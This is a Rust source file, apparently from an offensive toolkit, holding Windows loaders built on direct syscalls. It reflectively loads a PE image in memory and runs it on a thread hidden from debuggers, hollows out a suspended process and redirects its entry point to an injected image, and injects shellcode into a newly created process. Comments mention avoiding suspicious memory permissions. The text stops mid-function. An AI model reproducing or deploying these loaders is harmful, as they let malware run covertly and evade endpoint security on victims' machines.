#![cfg(target_family = "windows")]

use crate::utils::structures::{
    IMAGE_nt_headS64, IMAGE_DOS_HEADER, IMAGE_IMPORT_DESCRIPTOR, IMAGE_SECTION_HEADER,
    MY_IMAGE_BASE_RELOCATION, MY_IMAGE_THUNK_DATA64,
};
use crate::utils::tools_windows::*;

use std::error::Error;
use std::ffi::{c_ulong, c_void};
use std::iter::once;

use ntapi::ntpsapi::{
    PsCreateInitialState, PPS_ATTRIBUTE_LIST, PROCESSINFOCLASS, PROCESS_BASIC_INFORMATION,
    PS_ATTRIBUTE_IMAGE_NAME, PS_ATTRIBUTE_LIST, PS_CREATE_INFO,
    THREAD_CREATE_FLAGS_CREATE_SUSPENDED, THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
};
use ntapi::ntrtl::{
    RtlAllocateHeap, RtlCreateProcessParametersEx, RtlDestroyProcessParameters, RtlFreeHeap,
    RtlInitUnicodeString, RtlProcessHeap, PRTL_USER_PROCESS_PARAMETERS,
    RTL_USER_PROC_PARAMS_NORMALIZED,
};
use winapi::shared::ntdef::{
    HANDLE, NTSTATUS, NT_SUCCESS, NULL, OBJECT_ATTRIBUTES, UNICODE_STRING,
};
use winapi::um::winnt::{
    CONTEXT_INTEGER, HEAP_ZERO_MEMORY, LARGE_INTEGER, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
    PAGE_READWRITE, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
};

use syscalls::syscall;
use windows_sys::Win32::Foundation::CloseHandle;
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{VirtualFree, PAGE_EXECUTE_READWRITE};
use windows_sys::Win32::System::Threading::GetCurrentProcess;

pub fn reflective_loader_syscalls(buf: Vec<u8>) -> Result<(), Box<dyn Error>> {
    //Retrieve the sizes of the headers and the PE image in memory
    let header_s = get_size(&buf, "header");
    let mut img_s = get_size(&buf, "image");
    if header_s == 0 || img_s == 0 {
        return Err("Error retrieving PE sizes".into());
    }

    unsafe {
        let mut status: NTSTATUS;
        let mut base = NULL;
        status = syscall!(
            "NtAllocateVirtualMemory",
            GetCurrentProcess(),
            &mut base,
            0,
            &mut img_s,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if !NT_SUCCESS(status) {
            log::debug!("Error allocating memory: {:x}", status);
            return Err(status.to_string().into());
        }

        //Retrieve the DOS magic header and the elfa new (address of the begining of the PE after the DOS header)
        status = syscall!(
            "NtWriteVirtualMemory",
            GetCurrentProcess(),
            base,
            buf.as_ptr() as *mut c_void,
            header_s,
            NULL
        );
        if !NT_SUCCESS(status) {
            log::debug!("Error writing PE headers into memory: {:x}", status);
            return Err(status.to_string().into());
        }

        let mut dos_head = IMAGE_DOS_HEADER::default();
        fill_structure_from_array(&mut dos_head, &buf, true);

        log::debug!("DOS magic header : {:x?}", dos_head.e_magic);
        log::debug!(
            "Elfa new (address of the begining of the PE): {:x?}",
            dos_head.e_lfanew
        );

        //Retrieve the NT headers starting at the elfa new address
        let mut nt_head = IMAGE_nt_headS64::default();
        fill_structure_from_memory(
            &mut nt_head,
            (base as isize + dos_head.e_lfanew as isize) as *const c_void,
            GetCurrentProcess(),
            true,
        );

        log::debug!("NT headers : {:#x?}", nt_head);

        //Retrieve the sections (following the NT headers), their sizes, and map their contents from disk into memory
        let mut sections: Vec<IMAGE_SECTION_HEADER> =
            vec![IMAGE_SECTION_HEADER::default(); nt_head.FileHeader.NumberOfSections as usize];
        for i in 0..sections.len() {
            fill_structure_from_memory(
                &mut sections[i],
                (base as usize
                    + dos_head.e_lfanew as usize
                    + std::mem::size_of_val(&nt_head) as usize
                    + (i * std::mem::size_of::<IMAGE_SECTION_HEADER>() as usize))
                    as *const c_void,
                GetCurrentProcess(),
                true,
            );
            log::debug!(
                "Virtual addresses of sections {} is {:#x?}",
                string_from_array(&mut sections[i].Name.to_vec()),
                sections[i].VirtualAddress
            );

            //Retrieve the content of one section (a buffer starting at the RawAddr to RawAddr + RawSize)
            //Write it into memory at the addr base+VA
            let tmp: Vec<u8> = buf[sections[i].PointerToRawData as usize
                ..(sections[i].PointerToRawData as usize + sections[i].SizeOfRawData as usize)]
                .to_vec();
            status = syscall!(
                "NtWriteVirtualMemory",
                GetCurrentProcess(),
                (base as usize + sections[i].VirtualAddress as usize) as *mut c_void,
                tmp.as_ptr() as *mut c_void,
                tmp.len(),
                NULL
            );
            if !NT_SUCCESS(status) {
                log::debug!("Error writing section content into memory: {:x}", status);
                return Err(status.to_string().into());
            }
        }

        //Retrieve the imports and fix them
        log::debug!("{:?}", nt_head.OptionalHeader);
        if nt_head.OptionalHeader.ImportTable.Size > 0 {
            //Data addr before loading in memory
            let mut origin_first_thunk =
                base as usize + nt_head.OptionalHeader.ImportTable.VirtualAddress as usize;
            loop {
                //Data structure of the imported DLL
                let mut image_descriptor = IMAGE_IMPORT_DESCRIPTOR::default();
                fill_structure_from_memory(
                    &mut image_descriptor,
                    origin_first_thunk as *const c_void,
                    GetCurrentProcess(),
                    true,
                );
                if image_descriptor.Name == 0 && image_descriptor.FirstThunk == 0 {
                    log::debug!("No more import");
                    break;
                } else {
                    //Retrieve the DLL name and load it by retrieving the name at this address pointed by Name
                    let import_name = read_from_memory(
                        (base as usize + image_descriptor.Name as usize) as *const c_void,
                        GetCurrentProcess(),
                        true,
                    );
                    let load_dll = LoadLibraryA(import_name.as_bytes().as_ptr() as *const u8);
                    log::debug!("Import DLL name : {}", import_name);

                    //Get pointer of the first thunk of data containing the data of the first imported function
                    let mut thunk_ptr = base as usize
                        + image_descriptor.Characteristics_or_OriginalFirstThunk as usize;
                    let mut i = 0;

                    //Parse each thunk one by one to retrieve all the imported functions
                    loop {
                        let mut thunk_data = MY_IMAGE_THUNK_DATA64::default();
                        fill_structure_from_memory(
                            &mut thunk_data,
                            (thunk_ptr as usize) as *const c_void,
                            GetCurrentProcess(),
                            true,
                        );
                        log::debug!("{:?}", thunk_data);
                        if thunk_data.Address == [0; 8]
                            && u64::from_ne_bytes(thunk_data.Address.try_into().unwrap())
                                < 0x8000000000000000
                        {
                            log::debug!("No more data");
                            break;
                        } else {
                            //For each function, retrieve its name and its addr in memory
                            let offset = u64::from_ne_bytes(thunk_data.Address.try_into().unwrap());
                            let function_name = read_from_memory(
                                (base as usize + offset as usize + 2) as *const c_void,
                                GetCurrentProcess(),
                                true,
                            );
                            log::debug!("Function : {}", function_name);

                            let function_addr = i64::to_ne_bytes(
                                GetProcAddress(
                                    load_dll,
                                    function_name.as_bytes().as_ptr() as *const u8,
                                )
                                .unwrap() as i64,
                            );

                            //Write the function and its data in memory at its addr
                            status = syscall!(
                                "NtWriteVirtualMemory",
                                GetCurrentProcess(),
                                ((base as usize + image_descriptor.FirstThunk as usize) + i * 8)
                                    as *mut c_void,
                                function_addr.as_ptr() as *mut c_void,
                                function_addr.len(),
                                NULL
                            );
                            if !NT_SUCCESS(status) {
                                log::debug!(
                                    "Error writing functions' data into memory: {:x}",
                                    status
                                );
                                return Err(status.to_string().into());
                            }

                            i += 1;
                            thunk_ptr += 8;
                        }
                    }

                    origin_first_thunk += std::mem::size_of::<IMAGE_IMPORT_DESCRIPTOR>();
                }
            }
        }

        //Fix base relocations in case of hardcoded values
        if nt_head.OptionalHeader.BaseRelocationTable.Size > 0 {
            //Calculate the delta and retrieve the first relocation ptr
            let delta = base as usize - nt_head.OptionalHeader.ImageBase as usize;
            let mut first_reloc_ptr =
                base as usize + nt_head.OptionalHeader.BaseRelocationTable.VirtualAddress as usize;

            loop {
                //Fill the relocation structure from the struct at the ptr (retrieve relocation RVA and block size)
                let mut reloc = MY_IMAGE_BASE_RELOCATION::default();
                fill_structure_from_memory(
                    &mut reloc,
                    first_reloc_ptr as *const c_void,
                    GetCurrentProcess(),
                    true,
                );

                if reloc.SizeofBlock == 0 {
                    log::debug!("No more relocation");
                    break;
                } else {
                    log::debug!("Size of block : {:x?}", reloc.SizeofBlock);
                    log::debug!("Virtual addr : {:x?}", reloc.VirtualAddress);

                    //For each entries, retrieve the offset from the page addr and the hardcoded values at the relocation RVA
                    let entries = (reloc.SizeofBlock - 8) / 2;
                    log::debug!("Entries : {:x?}", entries);
                    for i in 0..entries {
                        let mut offset_from_page: [u8; 2] = [0; 2];

                        status = syscall!(
                            "NtReadVirtualMemory",
                            GetCurrentProcess(),
                            (first_reloc_ptr + 8 + (i * 2) as usize) as *mut c_void,
                            offset_from_page.as_mut_ptr() as *mut c_void,
                            offset_from_page.len(),
                            NULL
                        );
                        if !NT_SUCCESS(status) {
                            log::debug!("Error retrieving offset from the page addr: {:x}", status);
                            return Err(status.to_string().into());
                        }

                        log::debug!("Offset : {:x?}", offset_from_page);
                        let temp = u16::from_ne_bytes(offset_from_page.try_into().unwrap());

                        //println!("{:x?}",temp&0x0fff);

                        if (temp >> 12) == 0xA {
                            //Calculate relocation RVA of each entries with the base addr + relocation RVA of the first block + offset
                            // 1&0=0  0&0=0
                            let block_reloc_rva = base as usize
                                + reloc.VirtualAddress as usize
                                + (temp & 0x0fff) as usize;

                            //Read the hardcoded values at the entry addr and translate to obtain the fixed addr
                            let mut harcoded_value: [u8; 8] = [0; 8];
                            status = syscall!(
                                "NtReadVirtualMemory",
                                GetCurrentProcess(),
                                block_reloc_rva as *mut c_void,
                                harcoded_value.as_mut_ptr() as *mut c_void,
                                harcoded_value.len(),
                                NULL
                            );
                            if !NT_SUCCESS(status) {
                                log::debug!("Error reading hardcoded values: {:x}", status);
                                return Err(status.to_string().into());
                            }

                            log::debug!("Harcoded value at RVA : {:x?}", harcoded_value);
                            let fixe_addr =
                                isize::from_ne_bytes(harcoded_value.try_into().unwrap())
                                    + delta as isize;

                            log::debug!("{:x?}", fixe_addr);
                            //Write into memory
                            status = syscall!(
                                "NtWriteVirtualMemory",
                                GetCurrentProcess(),
                                block_reloc_rva as *mut c_void,
                                fixe_addr.to_ne_bytes().as_ptr() as *mut c_void,
                                8,
                                NULL
                            );
                            if !NT_SUCCESS(status) {
                                log::debug!(
                                    "Error writing hardcoded values into memory: {:x}",
                                    status
                                );
                                return Err(status.to_string().into());
                            }
                        }
                    }
                }

                first_reloc_ptr += reloc.SizeofBlock as usize;
            }
        }

        //Change the Read/Write memory access to Read/Write/Execute
        let mut old_perms = PAGE_READWRITE;
        status = syscall!(
            "NtProtectVirtualMemory",
            GetCurrentProcess(),
            &mut base,
            &mut img_s,
            PAGE_EXECUTE_READWRITE,
            &mut old_perms
        );
        if !NT_SUCCESS(status) {
            log::debug!("Error changing memory permissions: {:x}", status);
            return Err(status.to_string().into());
        }

        let mut thread_handle: HANDLE = NULL;
        status = syscall!(
            "NtCreateThreadEx",
            &mut thread_handle,
            THREAD_ALL_ACCESS,
            NULL,
            GetCurrentProcess(),
            (base as usize + nt_head.OptionalHeader.AddressOfEntryPoint as usize) as *mut c_void,
            NULL,
            THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
            0 as usize,
            0 as usize,
            0 as usize,
            NULL
        );
        if !NT_SUCCESS(status) {
            log::debug!("Error creating thread: {:x}", status);
            return Err(status.to_string().into());
        }

        status = syscall!(
            "NtWaitForSingleObject",
            thread_handle,
            0,
            NULL as *mut _ as *mut LARGE_INTEGER
        );
        if !NT_SUCCESS(status) {
            log::debug!("Error waiting for execution: {:x}", status);
            return Err(status.to_string().into());
        }
        VirtualFree(base, 0, 0x00008000);
    }

    Ok(())
}

fn get_destination_base_addr(prochandle: *mut c_void) -> usize {
    unsafe {
        let mut process_information: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
        let process_information_class = PROCESSINFOCLASS::default();
        syscall!(
            "NtQueryInformationProcess",
            prochandle,
            process_information_class,
            &mut process_information as *mut _ as *mut c_void,
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            NULL
        );
        let peb_image_offset = process_information.PebBaseAddress as u64 + 0x10;
        let mut image_base_buffer = [0; std::mem::size_of::<&u8>()];
        syscall!(
            "NtReadVirtualMemory",
            prochandle,
            peb_image_offset as *const c_void,
            image_base_buffer.as_mut_ptr() as *mut c_void,
            image_base_buffer.len(),
            NULL
        );

        log::debug!(
            "Image Base Addr : {:x?}",
            usize::from_ne_bytes(image_base_buffer)
        );
        return usize::from_ne_bytes(image_base_buffer);
    }
}

pub fn remote_loader_syscalls(buf: Vec<u8>, pe_to_execute: &str) -> Result<(), Box<dyn Error>> {
    //Retrieve the sizes of the headers and the PE image in memory
    let header_s = get_size(&buf, "header");
    let mut img_s = get_size(&buf, "image");
    if header_s == 0 || img_s == 0 {
        return Err("Error retrieving PE sizes".into());
    }

    let mut status: NTSTATUS;
    let mut prochandle: HANDLE = NULL;
    let mut threadhandle: HANDLE = NULL;

    unsafe {
        let mut full_path = "\\??\\".to_owned() + pe_to_execute;
        full_path = full_path.trim().to_owned() + "\0";

        let mut nt_image_path: UNICODE_STRING = UNICODE_STRING::default();

        // Image path in NT format
        // https://stackoverflow.com/questions/76211265/pdhaddcounterw-no-rules-expected-this-token-in-macro-call
        let source_string = full_path.encode_utf16().chain(once(0)).collect::<Vec<_>>();
        RtlInitUnicodeString(&mut nt_image_path, source_string.as_ptr() as *const u16);

        // Process parameters building
        let mut process_parameters: PRTL_USER_PROCESS_PARAMETERS = std::mem::zeroed();
        status = RtlCreateProcessParametersEx(
            &mut process_parameters,
            &mut nt_image_path,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            RTL_USER_PROC_PARAMS_NORMALIZED,
        );
        if !NT_SUCCESS(status) {
            log::debug!("Error creating process parameters: {:x}", status);
            return Err(status.to_string().into());
        }

        // PS_CREATE_INFO structure building
        let mut create_info = PS_CREATE_INFO::default();
        create_info.Size = std::mem::size_of::<PS_CREATE_INFO>();
        create_info.State = PsCreateInitialState;

        // Process and thread attributs building
        let attribute_list: PPS_ATTRIBUTE_LIST = RtlAllocateHeap(
            RtlProcessHeap(),
            HEAP_ZERO_MEMORY,
            std::mem::size_of::<PS_ATTRIBUTE_LIST>(),
        ) as PPS_ATTRIBUTE_LIST;
        attribute_list.as_mut().unwrap().TotalLength = std::mem::size_of::<PS_ATTRIBUTE_LIST>();
        attribute_list.as_mut().unwrap().Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
        attribute_list.as_mut().unwrap().Attributes[0].Size = nt_image_path.Length as usize;
        attribute_list.as_mut().unwrap().Attributes[0].u.Value = nt_image_path.Buffer as usize;

        // New process startup
        status = syscall!(
            "NtCreateUserProcess",
            &mut prochandle,
            &mut threadhandle,
            PROCESS_ALL_ACCESS,
            THREAD_ALL_ACCESS,
            NULL as *mut OBJECT_ATTRIBUTES,
            NULL as *mut OBJECT_ATTRIBUTES,
            0 as c_ulong,
            THREAD_CREATE_FLAGS_CREATE_SUSPENDED as c_ulong,
            process_parameters as *mut c_void,
            &mut create_info,
            attribute_list
        );
        if !NT_SUCCESS(status) {
            log::debug!("Error creating process: {:x}", status);
            return Err(status.to_string().into());
        }

        RtlFreeHeap(RtlProcessHeap(), 0, attribute_list as *mut c_void);
        RtlDestroyProcessParameters(process_parameters);

        let mut remote_base = get_destination_base_addr(prochandle) as *mut c_void;

        //Set the memory access to Read/Write for the moment to avoid suspicious rwx
        let mut base = NULL;
        status = syscall!(
            "NtAllocateVirtualMemory",
            GetCurrentProcess(),
            &mut base,
            0,
            &mut img_s,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if !NT_SUCCESS(status) {
            log::debug!(
                "Error allocating memory for the current process: {:x}",
                status
            );
        }
        status = syscall!("NtUnmapViewOfSection", prochandle, remote_base);
        if !NT_SUCCESS(status) {
            log::debug!("Error calling NtUnmapViewOfSection: {:x}", status);
        }
        status = syscall!(
            "NtAllocateVirtualMemory",
            prochandle,
            &mut remote_base,
            0,
            &mut img_s,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if !NT_SUCCESS(status) {
            log::debug!(
                "Error allocating memory for the remote process: {:x}",
                status
            );
        }

        //Retrieve the DOS magic header and the elfa new (address of the begining of the PE after the DOS header)
        status = syscall!(
            "NtWriteVirtualMemory",
            prochandle,
            remote_base,
            buf.as_ptr() as *mut c_void,
            header_s,
            NULL
        );
        if !NT_SUCCESS(status) {
            log::debug!("Error writing PE headers into memory: {:x}", status);
        }

        //Parsing locally
        std::ptr::copy(buf.as_ptr() as *const u8, base as *mut u8, header_s);

        let mut dos_head = IMAGE_DOS_HEADER::default();
        fill_structure_from_memory(&mut dos_head, base, GetCurrentProcess(), false);

        log::debug!("DOS magic header : {:x?}", dos_head.e_magic);
        log::debug!(
            "Elfa new (address of the begining of the PE): {:x?}",
            dos_head.e_lfanew
        );

        //Retrieve the NT headers starting at the elfa new address
        let mut nt_head: IMAGE_nt_headS64 = IMAGE_nt_headS64::default();
        fill_structure_from_memory(
            &mut nt_head,
            (base as isize + dos_head.e_lfanew as isize) as *const c_void,
            GetCurrentProcess(),
            false,
        );

        log::debug!("NT headers : {:#x?}", nt_head);

        //Retrieve the sections (following the NT headers), their sizes, and map their contents from disk into memory
        let mut sections: Vec<IMAGE_SECTION_HEADER> =
            vec![IMAGE_SECTION_HEADER::default(); nt_head.FileHeader.NumberOfSections as usize];
        for i in 0..sections.len() {
            fill_structure_from_memory(
                &mut sections[i],
                (base as usize
                    + dos_head.e_lfanew as usize
                    + std::mem::size_of_val(&nt_head) as usize
                    + (i * std::mem::size_of::<IMAGE_SECTION_HEADER>() as usize))
                    as *const c_void,
                GetCurrentProcess(),
                false,
            );
            log::debug!(
                "Virtual addresses of sections {} is {:#x?}",
                string_from_array(&mut sections[i].Name.to_vec()),
                sections[i].VirtualAddress
            );

            //Retrieve the content of one section (a buffer starting at the RawAddr to RawAddr + RawSize)
            //Write it into memory at the addr base+VA
            let tmp: Vec<u8> = buf[sections[i].PointerToRawData as usize
                ..(sections[i].PointerToRawData as usize + sections[i].SizeOfRawData as usize)]
                .to_vec();

            status = syscall!(
                "NtWriteVirtualMemory",
                GetCurrentProcess(),
                (base as usize + sections[i].VirtualAddress as usize) as *mut c_void,
                tmp.as_ptr() as *mut c_void,
                sections[i].SizeOfRawData as usize,
                NULL
            );
            if !NT_SUCCESS(status) {
                log::debug!(
                    "Error writing section content into memory of current process: {:x}",
                    status
                );
            }

            status = syscall!(
                "NtWriteVirtualMemory",
                prochandle,
                (remote_base as usize + sections[i].VirtualAddress as usize) as *mut c_void,
                tmp.as_ptr() as *mut c_void,
                sections[i].SizeOfRawData as usize,
                NULL
            );
            if !NT_SUCCESS(status) {
                log::debug!(
                    "Error writing section content into memory of remote process: {:x}",
                    status
                );
            }
        }

        //Retrieve the imports and fix them
        log::debug!("{:?}", nt_head.OptionalHeader);
        if nt_head.OptionalHeader.ImportTable.Size > 0 {
            //Data addr before loading in memory
            let mut origin_first_thunk =
                base as usize + nt_head.OptionalHeader.ImportTable.VirtualAddress as usize;
            loop {
                //Data structure of the imported DLL
                let mut image_descriptor = IMAGE_IMPORT_DESCRIPTOR::default();
                fill_structure_from_memory(
                    &mut image_descriptor,
                    origin_first_thunk as *const c_void,
                    GetCurrentProcess(),
                    false,
                );
                if image_descriptor.Name == 0 && image_descriptor.FirstThunk == 0 {
                    log::debug!("No more import");
                    break;
                } else {
                    //Retrieve the DLL name and load it by retrieving the name at this address pointed by Name
                    let import_name = read_from_memory(
                        (base as usize + image_descriptor.Name as usize) as *const c_void,
                        GetCurrentProcess(),
                        false,
                    );
                    let load_dll = LoadLibraryA(import_name.as_bytes().as_ptr() as *const u8);
                    log::debug!("Import DLL name : {}", import_name);

                    //Get pointer of the first thunk of data containing the data of the first imported function
                    let mut thunk_ptr = base as usize
                        + image_descriptor.Characteristics_or_OriginalFirstThunk as usize;
                    let mut i = 0;

                    //Parse each thunk one by one to retrieve all the imported functions
                    loop {
                        let mut thunk_data = MY_IMAGE_THUNK_DATA64::default();
                        fill_structure_from_memory(
                            &mut thunk_data,
                            (thunk_ptr as usize) as *const c_void,
                            GetCurrentProcess(),
                            false,
                        );
                        log::debug!("{:x?}", thunk_data);
                        if thunk_data.Address == [0; 8]
                            && u64::from_ne_bytes(thunk_data.Address.try_into().unwrap())
                                < 0x8000000000000000
                        {
                            log::debug!("No more data");
                            break;
                        } else {
                            //For each function, retrieve its name and its addr in memory
                            let offset = u64::from_ne_bytes(thunk_data.Address.try_into().unwrap());
                            let function_name = read_from_memory(
                                (base as usize + offset as usize + 2) as *const c_void,
                                GetCurrentProcess(),
                                false,
                            );
                            log::debug!("Function : {}", function_name);

                            let function_addr = i64::to_ne_bytes(
                                GetProcAddress(
                                    load_dll,
                                    function_name.as_bytes().as_ptr() as *const u8,
                                )
                                .unwrap() as i64,
                            );

                            //Write the function and its data in memory at its addr
                            status = syscall!(
                                "NtWriteVirtualMemory",
                                GetCurrentProcess(),
                                ((base as usize + image_descriptor.FirstThunk as usize) + i * 8)
                                    as *mut c_void,
                                function_addr.as_ptr() as *const c_void,
                                function_addr.len(),
                                NULL
                            );
                            if !NT_SUCCESS(status) {
                                log::debug!(
                                    "Error writing functions' data into memory of current process: {:x}",
                                    status
                                );
                            }

                            status = syscall!(
                                "NtWriteVirtualMemory",
                                prochandle,
                                ((remote_base as usize + image_descriptor.FirstThunk as usize)
                                    + i * 8) as *mut c_void,
                                function_addr.as_ptr() as *const c_void,
                                function_addr.len(),
                                NULL
                            );
                            if !NT_SUCCESS(status) {
                                log::debug!(
                                    "Error writing functions' data into memory of remote process: {:x}",
                                    status
                                );
                            }

                            i += 1;
                            thunk_ptr += 8;
                        }
                    }

                    origin_first_thunk += std::mem::size_of::<IMAGE_IMPORT_DESCRIPTOR>();
                }
            }
        }

        //Fix base relocations in case of hardcoded values
        if nt_head.OptionalHeader.BaseRelocationTable.Size > 0 {
            //Calculate the delta and retrieve the first relocation ptr
            let delta = base as usize - nt_head.OptionalHeader.ImageBase as usize;
            let mut first_reloc_ptr =
                base as usize + nt_head.OptionalHeader.BaseRelocationTable.VirtualAddress as usize;

            loop {
                //Fill the relocation structure from the struct at the ptr (retrieve relocation RVA and block size)
                let mut reloc = MY_IMAGE_BASE_RELOCATION::default();
                fill_structure_from_memory(
                    &mut reloc,
                    first_reloc_ptr as *const c_void,
                    GetCurrentProcess(),
                    false,
                );

                if reloc.SizeofBlock == 0 {
                    log::debug!("No more relocation");
                    break;
                } else {
                    log::debug!("Size of block : {:x?}", reloc.SizeofBlock);
                    log::debug!("Virtual addr : {:x?}", reloc.VirtualAddress);

                    //For each entries, retrieve the offset from the page addr and the hardcoded values at the relocation RVA
                    let entries = (reloc.SizeofBlock - 8) / 2;
                    log::debug!("Entries : {:x?}", entries);
                    for i in 0..entries {
                        let mut offset_from_page: [u8; 2] = [0; 2];

                        status = syscall!(
                            "NtReadVirtualMemory",
                            GetCurrentProcess(),
                            (first_reloc_ptr + 8 + (i * 2) as usize) as *mut c_void,
                            offset_from_page.as_mut_ptr() as *mut c_void,
                            offset_from_page.len(),
                            NULL
                        );
                        if !NT_SUCCESS(status) {
                            log::debug!("Error retrieving offset from the page addr: {:x}", status);
                        }

                        log::debug!("Offset : {:x?}", offset_from_page);
                        let temp = u16::from_ne_bytes(offset_from_page.try_into().unwrap());

                        //println!("{:x?}", temp & 0x0fff);

                        if (temp >> 12) == 0xA {
                            //Calculate relocation RVA of each entries with the base addr + relocation RVA of the first block + offset
                            // 1&0=0  0&0=0
                            let block_reloc_rva = base as usize
                                + reloc.VirtualAddress as usize
                                + (temp & 0x0fff) as usize;

                            //Read the hardcoded values at the entry addr and translate to obtain the fixed addr
                            let mut harcoded_value: [u8; 8] = [0; 8];
                            status = syscall!(
                                "NtReadVirtualMemory",
                                GetCurrentProcess(),
                                block_reloc_rva as *const c_void,
                                harcoded_value.as_mut_ptr() as *mut c_void,
                                harcoded_value.len(),
                                NULL
                            );
                            if !NT_SUCCESS(status) {
                                log::debug!("Error reading hardcoded values: {:x}", status);
                            }

                            log::debug!("Harcoded value at RVA : {:x?}", harcoded_value);
                            let fixe_addr =
                                isize::from_ne_bytes(harcoded_value.try_into().unwrap())
                                    + delta as isize;

                            log::debug!("{:x?}", fixe_addr);
                            //Write into memory
                            status = syscall!(
                                "NtWriteVirtualMemory",
                                prochandle,
                                block_reloc_rva as *mut c_void,
                                fixe_addr.to_ne_bytes().as_ptr() as *mut c_void,
                                8,
                                NULL
                            );
                            if !NT_SUCCESS(status) {
                                log::debug!(
                                    "Error writing hardcoded values into memory: {:x}",
                                    status
                                );
                            }
                        }
                    }
                }

                first_reloc_ptr += reloc.SizeofBlock as usize;
            }
        }

        //Change the Read/Write memory access to Write/Execute
        let mut old_perms = PAGE_READWRITE;
        status = syscall!(
            "NtProtectVirtualMemory",
            prochandle,
            &mut remote_base,
            &mut img_s,
            PAGE_EXECUTE_READWRITE,
            &mut old_perms
        );
        if !NT_SUCCESS(status) {
            log::debug!("Error changing memory permissions: {:x}", status);
        }

        let mut ctx = std::mem::zeroed::<windows_sys::Win32::System::Diagnostics::Debug::CONTEXT>();
        ctx.ContextFlags = CONTEXT_INTEGER;
        status = syscall!("NtGetContextThread", threadhandle, &mut ctx);
        if !NT_SUCCESS(status) {
            log::debug!("Error getting thread context: {:x}", status);
        }
        ctx.Rcx = remote_base as u64 + nt_head.OptionalHeader.AddressOfEntryPoint as u64;
        status = syscall!("NtSetContextThread", threadhandle, &mut ctx);
        if !NT_SUCCESS(status) {
            log::debug!("Error setting thread context: {:x}", status);
        }
        VirtualFree(base, 0, 0x00004000);
        status = syscall!("NtResumeThread", threadhandle, NULL);
        if !NT_SUCCESS(status) {
            log::debug!("Error resuming thread: {:x}", status);
        }
        CloseHandle(prochandle as isize);
    }

    Ok(())
}

pub fn shellcode_loader_syscalls(
    mut shellcode: Vec<u8>,
    pe_to_execute: &str,
) -> Result<(), Box<dyn Error>> {
    let mut full_path = "\\??\\".to_owned() + pe_to_execute;
    full_path = full_path.trim().to_owned() + "\0";

    let mut status: NTSTATUS;
    let mut process_handle: HANDLE = NULL;
    let mut thread_handle: HANDLE = NULL;

    unsafe {
        let mut nt_image_path: UNICODE_STRING = UNICODE_STRING::default();

        // Image path in NT format
        // https://stackoverflow.com/questions/76211265/pdhaddcounterw-no-rules-expected-this-token-in-macro-call
        let source_string = full_path.encode_utf16().chain(once(0)).collect::<Vec<_>>();
        RtlInitUnicodeString(&mut nt_image_path, source_string.as_ptr() as *const u16);

        // Process parameters building
        let mut process_parameters: PRTL_USER_PROCESS_PARAMETERS = std::mem::zeroed();
        status = RtlCreateProcessParametersEx(
            &mut process_parameters,
            &mut nt_image_path,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            RTL_USER_PROC_PARAMS_NORMALIZED,
        );
        if !NT_SUCCESS(status) {
            log::debug!("Error creating process parameters : {:x}", status);
            return Err(status.to_string().into());
        }

        // PS_CREATE_INFO structure building
        let mut create_info = PS_CREATE_INFO::default();
        create_info.Size = std::mem::size_of::<PS_CREATE_INFO>();
        create_info.State = PsCreateInitialState;

        // Process and thread attributs building
        let attribute_list: PPS_ATTRIBUTE_LIST = RtlAllocateHeap(
            RtlProcessHeap(),
            HEAP_ZERO_MEMORY,
            std::mem::size_of::<PS_ATTRIBUTE_LIST>(),
        ) as PPS_ATTRIBUTE_LIST;
        attribute_list.as_mut().unwrap().TotalLength = std::mem::size_of::<PS_ATTRIBUTE_LIST>();
        attribute_list.as_mut().unwrap().Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
        attribute_list.as_mut().unwrap().Attributes[0].Size = nt_image_path.Length as usize;
        attribute_list.as_mut().unwrap().Attributes[0].u.Value = nt_image_path.Buffer as usize;

        // New process startup
        status = syscall!(
            "NtCreateUserProcess",
            &mut process_handle,
            &mut thread_handle,
            PROCESS_ALL_ACCESS,
            THREAD_ALL_ACCESS,
            NULL as *mut OBJECT_ATTRIBUTES,
            NULL as *mut OBJECT_ATTRIBUTES,
            0 as c_ulong,
            0 as c_ulong,
            process_parameters as *mut c_void,
            &mut create_info,
            attribute_list
        );
        if !NT_SUCCESS(status) {
            log::debug!("Error creating process : {:x}", status);
            return Err(status.to_string().into());
        }

        RtlFreeHeap(RtlProcessHeap(), 0, attribute_list as *mut c_void);
        RtlDestroyProcessParameters(process_parameters);
    }

    let mut base_addr = NULL;

    unsafe {
        status = syscall!(
            "NtAllocateVirtualMemory",
            process_handle,
            &mut base_addr,
            0,
            &mut shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
    }
    if !NT_SUCCESS(status) {
        log::debug!(
            "Error allocating memory in the target process: {:x}",
            status
        );
        return Err(status.to_string().into());
    }

    unsafe {
        status = syscall!(
            "NtWriteVirtualMemory",
            process_handle,
            base_addr,
            shellcode.as_mut_ptr() as *mut c_void,
            shellcode.len(),
            NULL
        );
    }
    if !NT_SUCCESS(status) {
        log::debug!("Error writing in the target process memory: {:x}", status);
        return Err(status.to_string().into());
    }

    unsafe {
        let mut old_perms = PAGE_READWRITE;
        status = syscall!(
            "NtProtectVirtualMemory",
            process_handle,
            &mut base_addr,
            &mut shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_perms
        );
    }
    if !NT_SUCCESS(status) {
        log::debug!("Error changing memory permission: {:x}", status);
        return Err(status.to_string().into());
    }

    shellcode.clear();
    shellcode.shrink_to_fit();

    let mut thread_handle: HANDLE = NULL;
